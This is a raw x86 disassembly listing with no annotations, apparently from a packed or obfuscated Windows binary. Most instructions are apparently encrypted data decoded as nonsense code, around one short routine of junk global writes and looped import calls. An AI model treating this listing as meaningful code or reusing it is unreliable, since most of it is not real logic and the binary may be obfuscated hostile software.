  40d1ac:	sbb    al,0xc4
  40d1ae:	xchg   ebp,eax
  40d1af:	fwait
  40d1b0:	lahf   
  40d1b1:	inc    ebp
  40d1b2:	in     al,dx
  40d1b3:	dec    ebx
  40d1b4:	sub    DWORD PTR [edx-0x62c190f2],ebp
  40d1ba:	pop    DWORD PTR [ebp+0x60]
  40d1bd:	call   0x7011656f
  40d1c2:	mov    ch,BYTE PTR [esi]
  40d1c4:	and    eax,0x378eea3f
  40d1c9:	add    eax,0xcda7fe8b
  40d1ce:	xchg   esi,edi
  40d1d0:	inc    esp
  40d1d1:	int3   
  40d1d2:	inc    edi
  40d1d3:	mov    dl,0x17
  40d1d5:	aas    
  40d1d6:	lods   al,BYTE PTR ds:[esi]
  40d1d7:	pop    ds
  40d1d8:	mov    al,ds:0xd2e82698
  40d1dd:	adc    eax,0xec54d576
  40d1e2:	push   es
  40d1e3:	sub    edi,edx
  40d1e5:	ss sahf 
  40d1e7:	push   ds
  40d1e8:	mov    ebp,0x4ba30d00
  40d1ed:	and    eax,0x85a92a5
  40d1f2:	adc    DWORD PTR [ebx],esi
  40d1f4:	adc    ebp,ecx
  40d1f6:	xor    eax,0xa2f3c60
  40d1fb:	daa    
  40d1fc:	dec    eax
  40d1fd:	daa    
  40d1fe:	push   esp
  40d1ff:	aad    0xa8
  40d201:	adc    eax,DWORD PTR [edi+0x1bf2141a]
  40d207:	adc    ah,cl
  40d209:	addr16 dec esi
  40d20b:	sar    BYTE PTR [ecx-0x55],1
  40d20e:	fs cmp eax,0x7dde4e87
  40d214:	rcl    BYTE PTR [ebx-0x7f],0xc3
  40d218:	ja     0x40d266
  40d21a:	(bad)  
  40d21b:	mov    ds:0x55bc372b,al
  40d221:	mov    WORD PTR [ebp-0x1c],ds
  40d224:	inc    eax
  40d225:	sub    al,0x49
  40d227:	adc    esp,DWORD PTR [eax]
  40d229:	mov    DWORD PTR [edi-0x6bed1cd0],esp
  40d22f:	lahf   
  40d230:	mov    ah,0x4e
  40d232:	pop    esp
  40d233:	push   0xffffffe1
  40d235:	mov    fs,WORD PTR [ebp-0x4f]
  40d238:	add    al,0xe
  40d23a:	add    ebp,eax
  40d23c:	and    DWORD PTR [ebx+eiz*4-0x24],ebx
  40d240:	scas   eax,DWORD PTR es:[edi]
  40d241:	add    edx,ecx
  40d243:	mov    bh,0x15
  40d245:	xlat   BYTE PTR ds:[ebx]
  40d246:	(bad)
  40d249:	sbb    ah,BYTE PTR [ecx+0x21f5c3c7]
  40d24f:	ret    0x79b
  40d252:	and    eax,0x2f26db2f
  40d257:	cmp    esp,DWORD PTR [edi+0x1a]
  40d25a:	test   DWORD PTR [ecx+0x374c1315],ebx
  40d260:	loopne 0x40d241
  40d262:	mov    WORD PTR [eax],cs
  40d264:	dec    eax
  40d265:	or     ecx,DWORD PTR [edx+0x55657822]
  40d26b:	ret    
  40d26c:	mov    edx,0xd98b45cd
  40d271:	in     eax,0xd1
  40d273:	dec    eax
  40d274:	xchg   edx,eax
  40d275:	(bad)  
  40d276:	jbe    0x40d23b
  40d278:	jp     0x40d21b
  40d27a:	push   esp
  40d27b:	daa    
  40d27c:	outs   dx,BYTE PTR ds:[esi]
  40d27d:	das    
  40d27e:	prefetcht1 BYTE PTR [ecx-0x1a]
  40d282:	mov    ds:0x818f5c50,al
  40d287:	xor    BYTE PTR [eax],dl
  40d289:	adc    DWORD PTR [edi],eax
  40d28b:	shl    edi,0xb8
  40d28e:	sub    edi,ecx
  40d290:	in     al,dx
  40d291:	dec    edx
  40d292:	xchg   edi,eax
  40d293:	test   DWORD PTR [ebx],0x39c02e5c
  40d299:	xchg   edx,eax
  40d29a:	popf   
  40d29b:	and    bh,ch
  40d29d:	inc    edx
  40d29e:	ja     0x40d2db
  40d2a0:	(bad)  
  40d2a1:	ins    BYTE PTR es:[edi],dx
  40d2a2:	adc    BYTE PTR [ebp+ecx*4-0x5d9a1b3d],dh
  40d2a9:	mov    esi,0xd726151c
  40d2ae:	push   cs
  40d2af:	mov    ebp,ecx
  40d2b1:	mov    eax,ds:0x44528fd8
  40d2b6:	push   ebx
  40d2b7:	das    
  40d2b8:	xchg   esi,eax
  40d2b9:	mov    ch,0xab
  40d2bb:	(bad)  
  40d2bc:	xchg   esi,eax
  40d2bd:	int3   
  40d2be:	and    esi,0xffffff83
  40d2c1:	push   ebx
  40d2c2:	out    0xb6,al
  40d2c4:	xchg   dx,ax
  40d2c6:	push   cs
  40d2c7:	mov    ecx,0xbd8b0943
  40d2cc:	jp     0x40d2d0
  40d2ce:	call   0xdd583cfa
  40d2d3:	enter  0xab3d,0x53
  40d2d7:	jae    0x40d357
  40d2d9:	inc    edx
  40d2da:	xchg   ebp,eax
  40d2db:	inc    edi
  40d2dc:	xchg   ecx,eax
  40d2dd:	dec    esi
  40d2de:	xchg   DWORD PTR [ebx],ebx
  40d2e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2e1:	mov    esi,0x9a8de92b
  40d2e6:	pop    ebx
  40d2e7:	push   edi
  40d2e8:	mov    esp,0xf54435c5
  40d2ed:	icebp  
  40d2ee:	jl     0x40d29d
  40d2f0:	xchg   edx,eax
  40d2f1:	dec    BYTE PTR [esi+0x242ce6db]
  40d2f7:	pop    esi
  40d2f8:	mov    dl,0xf
  40d2fa:	ret    0x2499
  40d2fd:	sub    al,0x13
  40d2ff:	es push eax
  40d301:	clc    
  40d302:	push   eax
  40d303:	cmp    eax,0x7b723d49
  40d308:	cld    
  40d309:	jnp    0x40d2a9
  40d30b:	and    al,bh
  40d30d:	add    ebp,ecx
  40d30f:	aad    0x60
  40d311:	xlat   BYTE PTR ds:[ebx]
  40d312:	cli    
  40d313:	repz (bad) 
  40d315:	jmp    0xae16:0xb4594fef
  40d31c:	es out dx,al
  40d31e:	mov    bl,al
  40d320:	cmc    
  40d321:	push   eax
  40d322:	xor    ebx,ebx
  40d324:	mov    edx,esp
  40d326:	dec    edx
  40d327:	jmp    0x40d58a
  40d32c:	fwait
  40d32d:	push   es
  40d32e:	mov    bl,0x2a
  40d330:	mov    bl,0xab
  40d332:	mov    ds:0x57b64c97,eax
  40d337:	pop    ebx
  40d338:	gs retf 0xa7ef
  40d33c:	mov    al,0x97
  40d33e:	jle    0x40d3be
  40d340:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40d344:	aaa    
  40d345:	xchg   dl,ch
  40d347:	and    BYTE PTR [eax],cl
  40d349:	xchg   esp,eax
  40d34a:	jns    0x40d3ab
  40d34c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d34d:	cmp    al,0x42
  40d34f:	jbe    0x40d3ac
  40d351:	mov    edx,0xb7eff129
  40d356:	inc    ecx
  40d357:	sbb    eax,0xb483fc22
  40d35c:	and    al,0xb7
  40d35e:	int3   
  40d35f:	fist   DWORD PTR [edx-0x71]
  40d362:	outs   dx,DWORD PTR ds:[esi]
  40d363:	sahf   
  40d364:	sbb    al,0x46
  40d366:	sbb    bl,cl
  40d368:	bnd jo 0x40d2f9
  40d36b:	xor    DWORD PTR [ebx+0x3808075a],edi
  40d371:	stos   BYTE PTR es:[edi],al
  40d372:	inc    ecx
  40d373:	pandn  mm2,QWORD PTR [eax+0x64]
  40d377:	ins    BYTE PTR es:[edi],dx
  40d378:	xor    esi,DWORD PTR [ebx+0x1124f042]
  40d37e:	sti    
  40d37f:	push   cs
  40d380:	push   esp
  40d381:	aam    0x2b
  40d383:	test   BYTE PTR [eax],ch
  40d385:	and    ah,BYTE PTR [edi-0x4c]
  40d388:	das    
  40d389:	dec    edi
  40d38a:	sub    bh,bh
  40d38c:	add    dl,BYTE PTR [edx-0x5e]
  40d38f:	inc    esp
  40d390:	(bad)  
  40d391:	pop    ecx
  40d392:	lds    ecx,FWORD PTR [ebp+0x70729e4f]
  40d398:	cdq    
  40d399:	test   dl,ch
  40d39b:	jmp    0x40d3e2
  40d39d:	push   ss
  40d39e:	jl     0x40d385
  40d3a0:	mov    BYTE PTR [eax],bl
  40d3a2:	inc    edx
  40d3a3:	ficom  WORD PTR [edi+0x1ad3ddd4]
  40d3a9:	in     eax,dx
  40d3aa:	jo     0x40d399
  40d3ac:	arpl   WORD PTR [ebp+0x4431fdf6],di
  40d3b2:	xchg   edi,eax
  40d3b3:	pop    esi
  40d3b4:	lock aaa 
  40d3b6:	xor    edi,DWORD PTR [eax]
  40d3b8:	and    dl,BYTE PTR [edx]
  40d3ba:	test   esi,ecx
  40d3bc:	test   DWORD PTR [edx-0x233f22fb],edx
  40d3c2:	out    0x9a,eax
  40d3c4:	push   ecx
  40d3c5:	bound  ebx,QWORD PTR [esi+0x692f5bd5]
  40d3cb:	add    eax,0xcc1f3415
  40d3d0:	jns    0x40d3ec
  40d3d2:	sub    eax,0x7b369bb9
  40d3d7:	mov    ds:0x68166951,al
  40d3dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d3dd:	retf   
  40d3de:	cdq    
  40d3df:	iret   
  40d3e0:	dec    ebp
  40d3e1:	ins    BYTE PTR es:[edi],dx
  40d3e2:	outs   dx,DWORD PTR ds:[esi]
  40d3e3:	into   
  40d3e4:	das    
  40d3e5:	or     DWORD PTR [ecx-0x4a],0x1a
  40d3e9:	inc    ebx
  40d3ea:	push   ss
  40d3eb:	jl     0x40d37c
  40d3ed:	push   ebp
  40d3ee:	jg     0x40d3bf
  40d3f0:	fmul   st(4),st
  40d3f2:	out    0x51,al
  40d3f4:	jb     0x40d414
  40d3f6:	fld    QWORD PTR [ebp+0x5ec6b504]
  40d3fc:	fnstsw WORD PTR [edi+0x1c]
  40d3ff:	jg     0x40d40f
  40d401:	pop    ss
  40d402:	or     DWORD PTR [ebp+0x75],esp
  40d405:	xchg   esi,eax
  40d406:	inc    ebx
  40d407:	in     al,dx
  40d408:	mov    esi,esp
  40d40a:	cmp    esi,DWORD PTR [eax-0x8d94e4b]
  40d410:	jmp    0x15ab:0xf30da9ce
  40d417:	push   esi
  40d418:	(bad)  
  40d419:	outs   dx,BYTE PTR ds:[esi]
  40d41a:	ja     0x40d3c6
  40d41c:	xchg   ebx,eax
  40d41d:	jne    0x40d45a
  40d41f:	mov    ebx,0xc24b9d30
  40d424:	popa   
  40d425:	xchg   ebx,eax
  40d426:	ret    0xc9da
  40d429:	aad    0x6d
  40d42b:	retf   
  40d42c:	xor    al,0x45
  40d42e:	cmp    BYTE PTR [ebx-0x3d4aef9a],dh
  40d434:	shr    dh,cl
  40d436:	mov    edi,0x5f0cde6a
  40d43b:	jno    0x40d48b
  40d43d:	adc    al,0x89
  40d43f:	dec    esp
  40d440:	sub    eax,0x218be1d1
  40d445:	inc    edi
  40d446:	ins    BYTE PTR es:[edi],dx
  40d447:	mov    esi,0xd19c6b40
  40d44c:	cmp    al,0xed
  40d44e:	push   edi
  40d44f:	ins    DWORD PTR es:[edi],dx
  40d450:	je     0x40d42d
  40d452:	mov    ah,0xfa
  40d454:	mov    bh,0x82
  40d456:	pop    es
  40d457:	das    
  40d458:	jp     0x40d49e
  40d45a:	rol    BYTE PTR [ebx+ecx*1],1
  40d45d:	aas    
  40d45e:	mov    ch,0xf7
  40d460:	add    BYTE PTR [eax],bl
  40d462:	nop
  40d463:	adc    edi,DWORD PTR [esi+0x1d00668a]
  40d469:	or     edi,DWORD PTR [eax]
  40d46b:	sbb    DWORD PTR [eax+0x3ea6c32d],eax
  40d471:	out    dx,al
  40d472:	into   
  40d473:	jle    0x40d4c8
  40d475:	pop    ecx
  40d476:	adc    BYTE PTR [eax],bh
  40d478:	mov    BYTE PTR [esi+0x7a23b542],ch
  40d47e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d47f:	cmp    eax,0x77782047
  40d484:	retf   0xca7c
  40d487:	in     eax,dx
  40d488:	jmp    0x4d8e4c7a
  40d48d:	bound  edi,QWORD PTR [esi]
  40d48f:	jnp    0x40d50b
  40d491:	call   0x5dd8:0x68e88364
  40d498:	and    DWORD PTR [eax+edi*4],eax
  40d49b:	xchg   ebp,eax
  40d49c:	xor    cl,BYTE PTR [esi]
  40d49e:	test   eax,0x61841106
  40d4a3:	out    0xa4,al
  40d4a5:	mov    WORD PTR [ecx],?
  40d4a7:	test   BYTE PTR [edx],dh
  40d4a9:	fadd   DWORD PTR [edx-0x2a51c141]
  40d4af:	mov    ecx,0x6f0b73d1
  40d4b4:	jecxz  0x40d45d
  40d4b6:	gs inc edx
  40d4b8:	inc    ebp
  40d4b9:	(bad)  
  40d4ba:	mov    al,ds:0x12a3601e
  40d4bf:	dec    esp
  40d4c0:	popa   
  40d4c1:	neg    DWORD PTR [ecx]
  40d4c3:	mov    esi,0xfdc4fcd2
  40d4c8:	pop    ds
  40d4c9:	stos   DWORD PTR es:[edi],eax
  40d4ca:	mov    al,0x17
  40d4cc:	cwde   
  40d4cd:	fisttp WORD PTR [edx+0x320d8f3d]
  40d4d3:	cdq    
  40d4d4:	test   DWORD PTR [ebx+0x38],ecx
  40d4d7:	dec    edi
  40d4d8:	ja     0x40d4b6
  40d4da:	jle    0x40d47e
  40d4dc:	(bad)  
  40d4de:	dec    esi
  40d4df:	xlat   BYTE PTR ds:[ebx]
  40d4e0:	pop    ebp
  40d4e1:	aaa    
  40d4e2:	ror    al,1
  40d4e4:	jbe    0x40d550
  40d4e6:	jne    0x40d4a0
  40d4e8:	and    al,0x92
  40d4ea:	pushf  
  40d4eb:	mov    fs,WORD PTR [esi-0x3502699]
  40d4f1:	xchg   ecx,eax
  40d4f2:	enter  0x2703,0x3
  40d4f6:	jae    0x40d529
  40d4f8:	or     dl,0xeb
  40d4fb:	sub    DWORD PTR [ebp+0x6a],ebp
  40d4fe:	mov    cl,0xd2
  40d500:	ins    BYTE PTR es:[edi],dx
  40d501:	jno    0x40d4d7
  40d503:	pop    eax
  40d504:	mov    eax,0x5021af14
  40d509:	sbb    al,0xf1
  40d50b:	inc    eax
  40d50c:	jns    0x40d50a
  40d50e:	ret    0x27a7
  40d511:	icebp  
  40d512:	repnz loopne 0x40d4a1
  40d515:	mov    ds:0x89f45201,al
  40d51a:	popa   
  40d51b:	dec    ecx
  40d51c:	aad    0x4c
  40d51e:	aad    0x3e
  40d520:	adc    DWORD PTR [edi],ebx
  40d522:	mov    WORD PTR [ecx+0xa97e771],?
  40d528:	adc    cl,BYTE PTR [eax-0x1401ab9f]
  40d52e:	xchg   ebp,eax
  40d52f:	mov    ah,0x27
  40d531:	sbb    al,0x15
  40d533:	pop    ss
  40d534:	inc    ecx
  40d536:	mov    eax,0xc5ea7eee
  40d53b:	stos   BYTE PTR es:[edi],al
  40d53c:	lods   al,BYTE PTR ds:[esi]
  40d53d:	call   0x7ca7bb37
  40d542:	mov    edi,0x78d0234a
  40d547:	jns    0x40d545
  40d549:	jecxz  0x40d58b
  40d54b:	push   ebp
  40d54c:	xlat   BYTE PTR ds:[ebx]
  40d54d:	xchg   ebx,eax
  40d54e:	cdq    
  40d54f:	shl    BYTE PTR [eax+0x692d64d6],1
  40d555:	sub    BYTE PTR [edx-0x2619c650],0xae
  40d55c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d55d:	jno    0x40d58d
  40d55f:	sub    BYTE PTR [edx],ch
  40d561:	fwait
  40d562:	(bad)  
  40d563:	arpl   WORD PTR [edx+0x60],sp
  40d566:	test   al,0xac
  40d568:	push   ss
  40d569:	cmp    al,0xf5
  40d56b:	and    BYTE PTR [esi-0x2dc17fa4],ch
  40d571:	cld    
  40d572:	gs jp  0x40d5b4
  40d575:	std    
  40d576:	mov    ch,0x98
  40d578:	cmp    dh,dl
  40d57a:	out    0x87,eax
  40d57c:	xor    BYTE PTR fs:[edx],al
  40d57f:	call   0x7bfc586b
  40d584:	add    DWORD PTR [ebx+0x40],ecx
  40d587:	or     al,0xcd
  40d589:	rol    DWORD PTR [ebx+0x3],cl
  40d58c:	sbb    al,0x1a
  40d58e:	dec    ebx
  40d58f:	xor    edx,edx
  40d591:	add    DWORD PTR [ebp-0xc],ebx
  40d594:	pop    ebx
  40d595:	mov    eax,DWORD PTR [ebp-0xc]
  40d598:	pop    edi
  40d599:	pop    esi
  40d59a:	pop    ebx
  40d59b:	leave  
  40d59c:	ret    0x10
  40d59f:	push   ebp
  40d5a0:	mov    ebp,esp
  40d5a2:	push   ecx
  40d5a3:	not    eax
  40d5a5:	push   ecx
  40d5a6:	mov    eax,0xf89c8532
  40d5ab:	mov    DWORD PTR ds:0x433823,ecx
  40d5b1:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40d5b8:	mov    DWORD PTR ds:0x433817,edx
  40d5be:	push   esi
  40d5bf:	mov    DWORD PTR ds:0x43381b,0x1f1b
  40d5c9:	mov    DWORD PTR [ebp-0x8],eax
  40d5cc:	mov    DWORD PTR ds:0x433827,0x659
  40d5d6:	mov    ecx,DWORD PTR [ebp+0x8]
  40d5d9:	push   edi
  40d5da:	not    edi
  40d5dc:	mov    edi,0x7510854
  40d5e1:	not    DWORD PTR ds:0x433863
  40d5e7:	mov    esi,0x32729b
  40d5ec:	mov    DWORD PTR ds:0x43381b,0x27d6
  40d5f6:	cmp    ecx,eax
  40d5f8:	mov    DWORD PTR ds:0x4338a7,0x52ab
  40d602:	je     0x40d94e
  40d608:	mov    eax,DWORD PTR [ebp-0x4]
  40d60b:	mov    ecx,DWORD PTR [ebp+0xc]
  40d60e:	sub    DWORD PTR ds:0x4338af,0x32
  40d618:	xor    eax,edi
  40d61a:	add    eax,esi
  40d61c:	mov    DWORD PTR ds:0x4337db,0x51fb
  40d626:	cmp    eax,ecx
  40d628:	mov    DWORD PTR ds:0x43385b,0x5a
  40d632:	je     0x40d94e
  40d638:	and    DWORD PTR ds:0x433897,0x0
  40d642:	mov    edx,DWORD PTR ds:0x433897
  40d648:	inc    edx
  40d649:	mov    DWORD PTR ds:0x433897,edx
  40d64f:	cmp    DWORD PTR ds:0x433897,0x25
  40d656:	jne    0x40d665
  40d65c:	push   DWORD PTR [ebp-0xc]
  40d65f:	call   DWORD PTR ds:0x4122a8
  40d665:	cmp    DWORD PTR ds:0x433897,0x18
  40d66c:	jb     0x40d642
  40d672:	and    DWORD PTR ds:0x4337e3,0x0
  40d67c:	xor    edx,edx
  40d67e:	add    edx,DWORD PTR ds:0x4337e3
  40d684:	inc    edx
  40d685:	mov    DWORD PTR ds:0x4337e3,edx
  40d68b:	cmp    DWORD PTR ds:0x4337e3,0x1c
  40d692:	jne    0x40d6a3
  40d698:	push   0x4338d3
  40d69d:	call   DWORD PTR ds:0x412360
  40d6a3:	cmp    DWORD PTR ds:0x4337e3,0x1b
  40d6aa:	jb     0x40d67c
  40d6b0:	movzx  eax,BYTE PTR ds:0x4337e7
  40d6b7:	add    eax,DWORD PTR ds:0x43381b
  40d6bd:	mov    ds:0x4337e7,eax
  40d6c2:	mov    eax,DWORD PTR [ebp-0x4]
  40d6c5:	xor    eax,edi
  40d6c7:	add    eax,esi
  40d6c9:	push   eax
  40d6ca:	push   DWORD PTR [ebp-0x8]
  40d6cd:	push   DWORD PTR [ebp-0x4]
  40d6d0:	mov    edx,DWORD PTR ds:0x413b34
  40d6d6:	call   0x4057b9
  40d6db:	mov    ecx,DWORD PTR ds:0x413b34
  40d6e1:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40d6e7:	jmp    0x40d944
  40d6ec:	mov    esi,0x704a1816
  40d6f1:	jo     0x40d75f
  40d6f3:	adc    al,BYTE PTR ds:0x47a0482a
  40d6f9:	dec    eax
  40d6fa:	les    ebx,FWORD PTR [edx+0x7a]
  40d6fd:	xchg   edx,eax
  40d6fe:	jle    0x40d77e
  40d700:	ds jl  0x40d781
  40d703:	jle    0x40d6c9
  40d705:	cmc    
  40d706:	pop    esp
  40d707:	adc    edi,ebp
  40d709:	fstp   st(3)
  40d70b:	inc    eax
  40d70c:	add    edx,DWORD PTR [edx+0x3415a0c5]
  40d712:	sbb    al,0x2b
  40d714:	dec    esi
  40d715:	xchg   ebx,eax
  40d716:	cli    
  40d717:	popa   
  40d718:	mov    WORD PTR [ebx+edx*1-0x68],ss
  40d71c:	add    DWORD PTR [ebp+ebx*4-0x70b45339],ebp
  40d723:	sbb    ch,BYTE PTR [eax-0x5130d517]
  40d729:	test   eax,0x6736ade3
  40d72e:	sub    DWORD PTR [edx-0x3c0767d],esp
  40d734:	cmp    ah,BYTE PTR [ebx+0x52]
  40d737:	or     esp,esp
  40d739:	dec    eax
  40d73a:	mov    ch,0x74
  40d73c:	inc    eax
  40d73d:	mov    eax,ds:0x4c4c2a73
  40d742:	and    al,0x93
  40d744:	xchg   DWORD PTR [edi-0xe45fd9],esi
  40d74a:	mov    edx,0xf104cb1c
  40d74f:	sub    BYTE PTR [ebx+0x7dbbf7c7],0x7
  40d756:	enter  0x7526,0x5d
  40d75a:	stos   BYTE PTR es:[edi],al
  40d75b:	data16 fxsave [ecx]
  40d75f:	and    al,0xd8
  40d761:	xchg   ebp,eax
  40d762:	cmp    edi,DWORD PTR [ecx]
  40d764:	ret    0x945e
  40d767:	xor    dl,BYTE PTR [ecx-0x7b6903ce]
  40d76d:	dec    ebx
  40d76e:	jg     0x40d720
  40d770:	pop    ds
  40d771:	add    ecx,DWORD PTR [esi-0x76f78eb2]
  40d777:	push   0x57
  40d779:	enter  0xe9e6,0xc1
  40d77d:	ins    DWORD PTR es:[edi],dx
  40d77e:	out    0xce,al
  40d780:	jne    0x40d7ee
  40d782:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d783:	test   BYTE PTR [ebx+0xda9f39e],cl
  40d789:	imul   eax,DWORD PTR [edi+0x72],0xf3d176c6
  40d790:	adc    eax,esp
  40d792:	jmp    0x40d78d
  40d794:	xlat   BYTE PTR ds:[ebx]
  40d795:	pop    eax
  40d796:	rcr    edx,0x14
  40d799:	and    edx,ebx
  40d79b:	push   ebp
  40d79c:	xchg   BYTE PTR [edi+0x41],ch
  40d79f:	xchg   esi,eax
  40d7a0:	push   ebp
  40d7a1:	lods   eax,DWORD PTR ds:[esi]
  40d7a2:	inc    edi
  40d7a3:	mov    al,0xe7
  40d7a5:	imul   edi,DWORD PTR [ecx],0x54
  40d7a8:	enter  0xb71c,0xec
  40d7ac:	cdq    
  40d7ad:	shl    DWORD PTR [edx],cl
  40d7af:	ja     0x40d748
  40d7b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7b2:	lods   eax,DWORD PTR ds:[esi]
  40d7b3:	imul   edi,edx,0x24ff244f
  40d7b9:	scas   eax,DWORD PTR es:[edi]
  40d7ba:	out    dx,eax
  40d7bb:	jno    0x40d79a
  40d7bd:	push   ebx
  40d7be:	dec    eax
  40d7bf:	ins    DWORD PTR es:[edi],dx
  40d7c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7c1:	adc    esp,DWORD PTR [esi]
  40d7c3:	and    ah,0x95
  40d7c6:	push   ebx
  40d7c7:	xor    bh,ah
  40d7c9:	push   edx
  40d7ca:	mov    cl,0xaf
  40d7cc:	dec    edi
  40d7cd:	adc    eax,0xdbe18916
  40d7d2:	inc    esi
  40d7d3:	push   ecx
  40d7d4:	outs   dx,DWORD PTR ds:[esi]
  40d7d5:	sbb    BYTE PTR [ebx+ecx*8],bh
  40d7d8:	outs   dx,BYTE PTR ds:[esi]
  40d7d9:	and    esp,DWORD PTR [ebp-0x20058851]
  40d7df:	add    al,0xae
  40d7e1:	add    DWORD PTR [edx],esp
  40d7e3:	out    dx,al
  40d7e4:	ret    
  40d7e5:	adc    bh,bl
  40d7e7:	je     0x40d78b
  40d7e9:	pop    edi
  40d7ea:	pushf  
  40d7eb:	in     eax,0x4d
  40d7ed:	outs   dx,DWORD PTR ds:[esi]
  40d7ee:	fisubr WORD PTR [esi]
  40d7f0:	xchg   edx,eax
  40d7f1:	(bad)  
  40d7f2:	pusha  
  40d7f3:	ds cdq 
  40d7f5:	addr16 je 0x40d799
  40d7f8:	mov    ebx,ebx
  40d7fa:	mov    ds:0x1343b3a3,eax
  40d7ff:	loop   0x40d7c7
  40d801:	push   cs
  40d802:	imul   edx,eax,0x9681549e
  40d808:	cmp    BYTE PTR [ecx+eiz*2-0x5],ch
  40d80c:	pushf  
  40d80d:	add    al,0xbf
  40d80f:	cmp    al,BYTE PTR [esi]
  40d811:	mov    edx,DWORD PTR [esi]
  40d813:	mov    ch,0x28
  40d815:	add    esp,DWORD PTR [esi+0x1be65c93]
  40d81b:	fiadd  DWORD PTR [edx+0x50597465]
  40d821:	xlat   BYTE PTR ds:[ebx]
  40d822:	and    al,dl
  40d824:	add    BYTE PTR [edx+0x4b],bh
  40d827:	mov    edx,0xab16973
  40d82c:	dec    ecx
  40d82d:	xor    cl,BYTE PTR [ebp-0x59fa28b7]
  40d833:	push   eax
  40d834:	in     al,0x34
  40d836:	xor    ebx,DWORD PTR [ebp+0x32]
  40d839:	sbb    DWORD PTR [edi+0x14],ebx
  40d83c:	cmp    DWORD PTR ds:0x4c788282,ebp
  40d842:	fild   QWORD PTR [eax]
  40d844:	fdivr  DWORD PTR [ebx-0x4c]
  40d847:	stc    
  40d848:	(bad)  
  40d849:	cld    
  40d84a:	adc    edi,DWORD PTR [edx+0x21a316e8]
  40d850:	pop    ecx
  40d851:	mov    dl,BYTE PTR [esi+0x7a]
  40d854:	jp     0x40d893
  40d856:	jp     0x40d84b
  40d858:	repz mov eax,ds:0x5123d2d3
  40d85e:	add    DWORD PTR [eax-0x78da6c00],eax
  40d864:	mov    ch,0xf0
  40d866:	sbb    al,0xcf
  40d868:	add    WORD PTR [edx+0x28],si
  40d86c:	inc    ebx
  40d86d:	aam    0x32
  40d86f:	xchg   ebp,eax
  40d870:	fidivr DWORD PTR [edx-0x3f]
  40d873:	into   
  40d874:	not    BYTE PTR [esi]
  40d876:	and    edx,DWORD PTR [esi+0x6609e740]
  40d87c:	loopne 0x40d80f
  40d87e:	push   ds
  40d87f:	scas   eax,DWORD PTR es:[edi]
  40d880:	inc    esp
  40d881:	jns    0x40d83d
  40d883:	stos   DWORD PTR es:[edi],eax
  40d884:	inc    edi
  40d885:	cwde   
  40d886:	into   
  40d887:	add    al,0x85
  40d889:	mov    bl,0x98
  40d88b:	or     BYTE PTR [esi],0x6d
  40d88e:	sahf   
  40d88f:	cs out dx,eax
  40d891:	add    esi,esp
  40d893:	cmc    
  40d894:	fist   WORD PTR [edx-0x683c05a]
  40d89a:	stc    
  40d89b:	shr    ah,1
  40d89d:	sub    BYTE PTR [edi+ebx*1],0x2a
  40d8a1:	cmp    DWORD PTR [ecx],ecx
  40d8a3:	mov    bl,0x65
  40d8a5:	cli    
  40d8a6:	shl    BYTE PTR [esi],0x66
  40d8a9:	xor    BYTE PTR [ebx+0x24e0195d],cl
  40d8af:	push   0xffffffc7
  40d8b1:	adc    DWORD PTR [ebx-0x6a],edi
  40d8b4:	xchg   esi,eax
  40d8b5:	es mov bh,0x9f
  40d8b8:	mov    esp,0xf7c6f4ea
  40d8bd:	cdq    
  40d8be:	sub    ebx,DWORD PTR [eax-0x79]
  40d8c1:	xchg   DWORD PTR [ebx-0x23],edx
  40d8c4:	jle    0x40d920
  40d8c6:	mov    eax,0x4a336673
  40d8cb:	jp     0x40d8ad
  40d8cd:	sub    eax,0x34bbedbf
  40d8d2:	in     al,dx
  40d8d3:	mov    WORD PTR [ebx],cs
  40d8d5:	adc    BYTE PTR [ecx-0x53],ah
  40d8d8:	sub    DWORD PTR [esp+ebp*4-0x66bc2123],edi
  40d8df:	add    BYTE PTR [ecx],al
  40d8e1:	popf   
  40d8e2:	daa    
  40d8e3:	push   ecx
  40d8e4:	loopne 0x40d8ca
  40d8e6:	push   ss
  40d8e7:	xor    DWORD PTR [eax-0x41],edx
  40d8ea:	xchg   edi,eax
  40d8eb:	push   DWORD PTR [ecx-0x2f4deb4f]
  40d8f1:	dec    ecx
  40d8f2:	jmp    0x4ce6caa3
  40d8f7:	enter  0xa2d5,0x97
  40d8fb:	mov    dl,bl
  40d8fd:	(bad)  
  40d8fe:	jne    0x40d891
  40d900:	pop    esi
  40d901:	pop    edx
  40d902:	push   cs
  40d903:	and    edx,DWORD PTR [ecx]
  40d905:	xor    BYTE PTR [ebx-0x1e],0x2
  40d909:	mov    esi,DWORD PTR [esi+0x3cff62bc]
  40d90f:	into   
  40d910:	stc    
  40d911:	or     ebp,DWORD PTR [edx-0x1b2a9687]
  40d917:	inc    edx
  40d918:	dec    edx
  40d919:	push   esi
  40d91a:	inc    ebx
  40d91b:	push   esi
  40d91c:	inc    eax
  40d91d:	loop   0x40d971
  40d91f:	in     al,0xfb
  40d921:	mov    esi,0x33607a29
  40d926:	cli    
  40d927:	mov    dh,0x57
  40d929:	or     cl,BYTE PTR [esi]
  40d92b:	scas   eax,DWORD PTR es:[edi]
  40d92c:	gs ins DWORD PTR es:[edi],dx
  40d92e:	icebp  
  40d92f:	and    eax,0x7a2c6bd8
  40d934:	shl    DWORD PTR [ecx-0x1aecde4c],0xb7
  40d93b:	ins    BYTE PTR es:[edi],dx
  40d93c:	mov    ebx,0x27da92a7
  40d941:	aaa    
  40d942:	jbe    0x40d95d
  40d944:	mov    DWORD PTR [ecx],eax
  40d946:	mov    eax,DWORD PTR [ebp-0x8]
  40d949:	jmp    0x40de40
  40d94e:	mov    eax,DWORD PTR [ebp-0x4]
  40d951:	mov    ecx,DWORD PTR [ebp+0x10]
  40d954:	xor    eax,edi
  40d956:	add    eax,esi
  40d958:	jmp    0x40dbb5
  40d95d:	or     DWORD PTR [ebx+0x1f],0x4172f5e2
  40d964:	imul   ebx,DWORD PTR [ecx],0x7a2b51ed
  40d96a:	dec    esp
  40d96b:	xor    ebp,DWORD PTR [edi+0x3a]
  40d96e:	nop
